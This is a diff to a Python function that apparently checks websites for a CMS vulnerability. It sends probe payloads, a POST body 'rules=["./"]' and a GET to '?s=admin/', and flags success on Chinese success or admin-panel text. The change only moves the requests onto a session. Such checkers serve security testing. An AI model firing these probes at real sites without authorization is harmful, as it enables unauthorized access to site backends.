@@ -29,21 +29,23 @@ def check(url):
     payload3 = "?s=admin/"
 
     try:
-        r = requests.get(url + payload1)
+        s = requests.session()
+        s.keep_alive = False
+        r = s.get(url + payload1)
         if "成功" in r.text:
             #print("成功")
             items['Type'] = 'GET'
             items['Request'] = make_request_package(r.request)
             results.append(items.copy()) # 只能append一个浅拷贝, 否则result中的数据将被覆盖
 
-        r = requests.post(url + payload2, data="rules=%5b%22%2e%5c%2f%22%5d")
+        r = s.post(url + payload2, data="rules=%5b%22%2e%5c%2f%22%5d")
         if "成功" in r.text:
             #print("成功")
             items['Type'] = 'POST'
             items['Request'] = make_request_package(r.request)
             results.append(items.copy())
 
-        r = requests.get(url + payload3)
+        r = s.get(url + payload3)
         if ("后台首页" in r.text or "文件管理" in r.text or "系统管理" in r.text or "内容管理" in r.text or "系统设置" in r.text):
             #print("成功")
             items['Type'] = 'GET'
